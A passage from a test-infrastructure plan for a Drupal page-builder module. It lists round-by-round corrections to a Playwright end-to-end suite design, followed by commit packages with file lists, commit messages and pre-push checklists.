| Playwright `storageState` does NOT capture sessionStorage | ✅ VERIFIED — playwright.dev/docs/auth | sessionStorage not needed for Drupal auth |
| Puck 0.22.0 changelog breaking changes | ⚠️ UNVERIFIED — must read before S0.4 build starts | Read github.com/measuredco/puck/releases/tag/v0.22.0 |
| **CORRECTION (2026-07-10, round 1):** §3.2 assertion count | ❌ WRONG → ✅ CORRECTED | Original: ~700 (flat "~9 avg"). Corrected: ~4,912 (Σ(N=1→18)[34+23N] = 4,545 + 367 kitchen sink). Undercounted 7×. |
| **CORRECTION (2026-07-10, round 1):** §3.7 total | ❌ WRONG → ✅ CORRECTED | Original: ~181 tests / ~1,351 assertions. Round-1 corrected: ~189 / ~5,608. |
| **CORRECTION (2026-07-10, round 1):** Shard lock | ❌ MISSING → ✅ ADDED | §2.4.1 added: serial journey must stay in one file; SHARD LOCK comment + CI canary. |
| **CORRECTION (2026-07-10, round 1):** PR-001 wrong oracle for mosaic_html | ❌ WRONG → ✅ CORRECTED | Split to PR-001 (escaped-context) + PR-011–PR-017 (mosaic_html security contract). J10 +7 tests. |
| **CORRECTION (2026-07-10, round 1):** `e2e-setup.sh` missing env guard | ❌ MISSING → ✅ ADDED | FINDING-007: hard `exit 1` on `IS_DDEV_PROJECT` check. |
| **CORRECTION (2026-07-10, round 2):** Serial mode kills sweep on first hard failure | ❌ DESIGN FLAW → ⚠️ PARTIALLY CORRECTED | §2.4 redesigned hard/soft split. However, `expect.soft()` does not prevent serial mode from skipping remaining tests (soft marks the test FAILED; serial skips on FAILED). Serial mode was FULLY removed in round-3 — see round-3 CORRECTION entry. |
| **CORRECTION (2026-07-10, round 2):** Axe scanning was quadratic (6N per pass) | ❌ WRONG → ✅ CORRECTED | New strategy: 1 full-page + 1 C(n)-scoped per pass = 7 fixed (was 6N variable + 18 fixed). Per-pass formula: 34+23N → 23+17N (then corrected to 28+17N in round-3). J2 total: ~4,912 → ~3,580 (then ~3,670 in round-3). Grand total: ~5,608 → ~4,294 (then ~4,384 in round-3). |
| **CORRECTION (2026-07-10, round 2):** Pixel baseline CI exclusion not stated | ❌ MISSING → ✅ ADDED | §2.5 + §6: `@pixel` tag + `--grep-invert @pixel` in all CI commands. |
| **CORRECTION (2026-07-10, round 2):** §2.4 code had 4 correctness bugs | ❌ WRONG → ✅ CORRECTED | (1) `{ request, workerInfo }` in beforeAll → `{ playwright: pw }, workerInfo`; (2) `nodeUuid` never assigned → `const { nid, uuid } = createJourneyNode(...)` now assigns both; (3) `visitAsAnonymous` used `clearCookies()` → now uses separate `browser.newContext()`; (4) `prevCount`/`accumulatedComponents`/`builderPage`/`frontendPage` undeclared → all declared in corrected code. |
| **CORRECTION (2026-07-10, round 2):** §3.4 "All 16 components" | ❌ WRONG → ✅ CORRECTED | 18 components per §3.1 (not 16). |
| **CORRECTION (2026-07-10, round 2):** mosaic_columns.invalid "if enforced" | ❌ ORACLE VIOLATION → ✅ CORRECTED | "if enforced" replaced with explicit action item: read schema, state definite expected outcome, or log FINDING. |
| **CORRECTION (2026-07-10, round 2):** Orphan fixtures in §4.1 | ❌ DECORATION → ✅ MAPPED | RTL, null_byte, unicode_xss, sql_injection, path_traversal now each mapped to a specific test or pairwise axis. |
| **CORRECTION (2026-07-10, round 2):** §2.4 A.4 preview oracle vague | ❌ INCOMPLETE → ✅ STATED | Pre-save contract: Tier B = loading skeleton; Tier A = undocumented → FINDING-008 (spec gap) added to §8. BuilderPage.assertPreviewBehavior() docstring updated. |
| **CORRECTION (2026-07-10, round 2):** Inline editing B.8 omitted (§3.2 = 0 assertions) | ❌ ORACLE VIOLATION → ✅ CORRECTED | §3.6 added: 4 SPEC-PENDING tests with explicit oracle written and skipped (`test.skip`). Counted in §3.8 summary. |
| **CORRECTION (2026-07-10, round 2):** FINDING-004 would permanently block phase gate | ❌ DESIGN FLAW → ✅ CORRECTED | J8-008 changed from `test.fail()` to `test.fixme()` (skips, not permanently red). Requires Arun's explicit acceptance to close phase gate. |
| **CORRECTION (2026-07-10, round 2):** `retries: 1` for non-journey tests | ❌ ORACLE VIOLATION → ✅ CORRECTED | Removed. `retries: 0` everywhere. Flaky tests logged as FINDINGs. Rationale in §6. |
| **CORRECTION (2026-07-10, round 2):** §2.4.1 shard count reasoning | ❌ WRONG REASONING → ✅ CORRECTED | Real protection is `fullyParallel: false` (not shard count limit). Added CI verification loop that asserts J2 tests land in exactly one shard. |
| **CORRECTION (2026-07-10, round 2):** "pubicly-accessible" typo in FINDING-007 | ❌ TYPO → ✅ FIXED | |
| **CORRECTION (2026-07-10, round 2):** `MOSAIC_QA_ENV_OVERRIDE` had no TTY warning | ❌ INCOMPLETE → ✅ FIXED | Override path now prints loud warning + `sleep 5` countdown when stdin is a TTY. |
| **CORRECTION (2026-07-10, round 3):** `test.describe.serial()` used for J2 accumulating journey | ❌ DESIGN FLAW → ✅ CORRECTED | Round-2 applied `expect.soft()` believing serial mode would continue past soft failures. That was wrong: `expect.soft()` marks the test FAILED; serial mode sees the FAILED result and skips all remaining tests. The hard/soft split is completely ineffective inside serial mode. The fix: `test.describe()` + `workers: 1` + `fullyParallel: false`. Tests run in declaration order on a single worker; module-scoped variables persist; a FAILED test fails ONLY that pass — N+1..18 still run. The round-2 instruction to use `expect.soft()` was correct as far as it went; it was insufficient because it did not also remove serial mode. §1.4, §1.9, §2.4 (prose, code, SHARD LOCK comment, known-broken comment, failure-mode contract), §2.4.1 (playwright.config.ts snippet) all updated. |
| **CORRECTION (2026-07-10, round 3):** §3.2 grand total fixed count was 23 (should be 28) | ❌ WRONG → ✅ CORRECTED | Per-pass fixed rows: A(7) + B+Twig(3) + C(12) + D(6) = 28. The grand total row incorrectly showed 23. |
| **CORRECTION (2026-07-10, round 3):** §3.2 C total variable was 12N (should be 6N) | ❌ WRONG → ✅ CORRECTED | C group variable is anon render 6N only (axe scans moved to fixed in round-2). The admin render 6N is in B, not C. 6N+6N=12N total render variable, but split across B(6N) and C(6N) — the C variable column was wrong. |
| **CORRECTION (2026-07-10, round 3):** §3.2 Σ formula and all totals | ❌ WRONG → ✅ CORRECTED | Σ(N=1→18)[28+17N] = 504+2,907 = 3,411 (was 3,321). J2 total: 3,411+259 = 3,670 (was 3,580). §3.8 grand total: ~4,384 assertions (was ~4,294). Pass-by-pass profile all totals +5. |
| **CORRECTION (2026-07-10, round 3):** Shard canary restricted to single spec file | ❌ WRONG → ✅ CORRECTED | `npx playwright test J2-author-page.spec.ts --shard=N/4 --list` computes shards over only that file — a different partition than the full suite. Canary now runs `npx playwright test --shard=N/4 --list` (full suite) and greps for J2. `((++VAR))` post-increment operator replaced with `VAR=$((VAR+1))` (avoids set -e trap on first call returning 0). |
| **CORRECTION (2026-07-10, round 3):** Viewport API `{w,h}` — invalid Playwright API | ❌ WRONG → ✅ CORRECTED | `page.setViewportSize()` requires `{ width, height }` not `{ w, h }`. Fixed in all 3 occurrences in §2.4 (admin loop, precision step, anon loop). Assertion messages updated to use `bp.width`. |
| **CORRECTION (2026-07-10, round 3):** `test.skip(title, true)` — invalid Playwright API | ❌ WRONG → ✅ CORRECTED | Valid forms: `test.skip(title, async () => {})` or inside test body `test.skip(true, 'reason')`. §3.6 inline editing tests updated to 4 separate `test.skip(title, async () => {})` calls. |
| **CORRECTION (2026-07-10, round 3):** `test.fixme(title, /* comment */)` — missing body | ❌ WRONG → ✅ CORRECTED | `test.fixme()` requires a test body function. §8 FINDING-004 updated to `test.fixme(title, async ({ page }) => { /* body */ })`. |
| **CORRECTION (2026-07-10, round 3):** `fetchInitialHtml()` used admin cookies | ❌ WRONG → ✅ CORRECTED | `this.page.request.fetch()` inherits admin session cookies — returns authenticated HTML, invalidating the Twig-first anonymity proof. §2.6 updated: method now requires an `anonRequest: APIRequestContext` parameter. §2.4 Twig-first step creates `playwright.request.newContext()` (no auth) and disposes it after. |
| **CORRECTION (2026-07-10, round 3):** Admin axe scan included toolbar | ❌ MISSING → ✅ CORRECTED | `#toolbar-administration` has its own a11y posture that is not Mosaic's responsibility. Added `.exclude(['#toolbar-administration'])` option to the full-page axe call in §2.4's axe step. Also noted in §2.1 directory layout that `axeCheck` helper accepts an options param. |
| **CORRECTION (2026-07-10, round 3):** `ComponentFixture` interface missing `textKey` and `style` | ❌ MISSING → ✅ ADDED | §4.2 now includes the full interface definition. `textKey?: string` (field name for Twig-first key text lookup, default 'text') and `style?: Record<string, string>` (CSS prop→expected value for precision assertions) added. |
| **CORRECTION (2026-07-10, round 3):** `fillAllProps` signature mismatch | ❌ WRONG → ✅ CORRECTED | §2.2 declared `fillAllProps(componentId, fixture: ComponentFixture)` but §2.4 calls `fillAllProps(componentId, fixture.valid)`. Signature updated to `fillAllProps(componentId, fields: Record<string, unknown>)` to match the call site. |
| **CORRECTION (2026-07-10, round 3):** CP-S0.4 missing `MosaicPuckAdapter.php` | ❌ MISSING → ✅ ADDED | S0.4.11 (FINDING-005 fix) changes `src/Plugin/Puck/Adapter/MosaicPuckAdapter.php` — a committable PHP file. Added to §12 CP-S0.4 files list and pre-push checklist. |
| **GAP (D19 2026-07-16): P12 `attrOracle` accommodation — REVERT OBLIGATION** | ⚠️ LEDGERED ACCOMMODATION | J2-lifecycle.spec.ts `PassFixture.attrOracle='placeholder'` on P12 uses a `<textarea>` entity-decode workaround because `mosaic_live_search.twig` double-encodes attributes (FINDING-NEXT-M). When the Twig fix ships, remove the decode and assert the raw attribute equals the fixture string verbatim. Cross-ref: VIOLATION-006, TODO.md "P12 CONDITIONALLY RATIFIED" ledger entry. |
| **GAP (D19 2026-07-16): J2-SINK fails at admin mobile — CP-MINHEIGHT not deployed** | ⚠️ OPEN / PENDING CP | DIAG-SINK PROBE OBSERVED: `.mosaic-puck-wrapper [data-puck-component]` parent `minHeight='0px'` on all three DSD hosts; CP-MINHEIGHT rule (mbu-canvas.css line 56: `.mosaic-puck-wrapper [data-puck-component] { min-height: 2rem; }`) is not deployed. Once CP-MINHEIGHT is committed and `drush cr` is run, SINK admin mobile should auto-pass (parent min-height 2rem > 0). The live_search-specific zero height is caused by no light-DOM slot content (see next GAP). |
| **GAP (D19 2026-07-16): FINDING-NEXT-N mechanism OBSERVED via DIAG-SINK probe** | ✅ MECHANISM OBSERVED (reclassified from INFERRED/CONTRADICTED) | mosaic-tabs: offsetHeight=120 (light-DOM slot children from Puck rendering contribute height). mosaic-carousel: offsetHeight=88 (same). mosaic-live-search: offsetHeight=0 (no light-DOM slot children; only inert `<template>` in light DOM; display=inline, no intrinsic height). All three: hasShadowRoot=false (DSD not processed by React DOM injection). Discriminator confirmed: slot children → height; no slot children → zero height. |

(The three entries above were written 2026-07-16 without amendment authorization — VIOLATION-007. Content ratified retroactively by Arun. All future TEST-TODO edits require explicit per-edit authorization in a directive.)

---

## 12. Commit Packages

### CP-S0.1 (UPDATED — stale commit message corrected)

**Branch:** `feature/s0.1-testids`
**Files to commit (NOT gitignored):**
```
.gitignore                          — AI/ entry
js/src/builder/PaletteCard.tsx      — data-testid on palette card root
js/src/builder/BuilderApp.tsx       — data-testid on canvas, toolbar, buttons, breakpoints, tabs
js/src/builder/TemplateSplash.tsx   — data-testid on splash, blank btn, category btns, cards
```
**UPDATED COMMIT MESSAGE (replaces the stale version in AI/TODO.md):**
```
test(builder): add data-testid hooks to all owned builder controls (S0.1)

S0.1 of Sprint 0 test infrastructure hardening.

Adds stable data-testid attributes to every builder control Mosaic owns:
palette items, canvas, toolbar buttons, breakpoints, mode tabs, and
splash screen. IDs are derived from component machine names — never from
translatable labels.

All selectors are exported from js/e2e/selectors.ts (gitignored) as the
single source of truth. This commit contains only the source changes;
the test file updates are gitignored and not committed.

NOTE: The S0.1 plan specified native Playwright dragTo() for drag tests.
That approach was superseded in Sprint 103 (B-088/B-036 fix) — drag now
uses page.mouse.* with a 3-level xpath climb to the dnd-kit wrapper.
The data-testid attributes added here remain correct and in use.
```

**Pre-push checklist:**
- [ ] `npx tsc --noEmit` passes in `js/`
- [ ] Old suite 127/127 green after bundle rebuild
- [ ] `git check-ignore -v AI/` confirms AI/ gitignored
- [ ] No staged `js/e2e/`, `sprints/`, `docs/`, `AI/` files
- [ ] Bundle rebuilt: `npm run build` in `js/`

---

### CP-S0.4 — Testability hooks + Playwright upgrade + eslint fix

**Branch:** `feature/s0.4-testability-hooks` (create from `1.0.x`)

**Files changed (commit-able — NOT gitignored):**
```
js/src/builder/BuilderApp.tsx              — 5 data-testid hooks (can-undo, can-redo, component-count, preview-state, save-state)
js/package.json                            — bump @playwright/test to ^1.61.1
js/eslint.config.js                        — no rule change needed (existing rule remains; violations fixed in gitignored files)
scripts/qa/e2e-setup.sh                    — IS_DDEV_PROJECT env guard (FINDING-007) + enable jsonapi + basic_auth + create mosaic_qa_api + toggle write mode
src/Plugin/Puck/Adapter/MosaicPuckAdapter.php  — fix FINDING-005 (S0.4.11): supply defaultProps from PHP field defaults so mosaic_heading renders <h2> on first drag
```

**Local-only (gitignored):**
```
js/e2e/helpers/json-api.ts                  — NEW
js/e2e/fixtures/components.ts              — NEW
js/e2e/fixtures/invalid.ts                 — NEW
js/e2e/pages/FrontendPage.ts               — NEW
js/e2e/pages/BuilderPage.ts                — extended with new methods
js/e2e/uat-100-scenarios.spec.ts           — FINDING-001 fix (6 waitForTimeout → toHaveAttribute)
js/e2e/uat-builder-journey.spec.ts         — FINDING-001 fix (2 waitForTimeout → toHaveAttribute)
```

**Commit message:**
```
test(builder): add testability hooks + bump Playwright to 1.61.1 (S0.4)

S0.4 of Sprint 0 test infrastructure hardening. Closes FINDING-001 and FINDING-002.

Adds five data-testid hooks to BuilderApp for web-first assertions:
- mosaic-can-undo / mosaic-can-redo: bound to Puck history state
- mosaic-component-count: stable count for post-drag assertions
- mosaic-preview-state: Tier B SSR state (loading/empty/ready)
- mosaic-save-state: save button lifecycle (idle/saving/saved/error)

These replace the six waitForTimeout(300) undo-debounce workarounds in
the UAT specs (FINDING-001: eslint no-wait-for-timeout violations).

Updates QA setup script to enable jsonapi + basic_auth modules and
toggle JSON:API write mode for per-test fixture creation/deletion.

Bumps @playwright/test to ^1.61.1 to unlock aria snapshots (toMatchAriaSnapshot,
introduced v1.49) needed for the Master Lifecycle Journey suite.
```

**Pre-push checklist:**
- [ ] `npm run verify` exits 0 (no waitForTimeout in gated files)
- [ ] Old suite 127/127 green (no regressions from testability hooks)
- [ ] `[data-testid="mosaic-can-undo"]` visible in live DDEV builder DOM
- [ ] `data-state` flips to `"true"` after a drag (verified manually in `--ui` mode)
- [ ] `scripts/qa/e2e-setup.sh` runs without error on a clean DDEV site
- [ ] FINDING-005 fixed: drag `mosaic_heading` onto canvas, verify rendered element is `<h2>` (not `<div>`) BEFORE any save — check in browser DevTools or `--ui` inspector
- [ ] `git check-ignore -v AI/` confirms AI/ gitignored
- [ ] No `js/e2e/` files staged
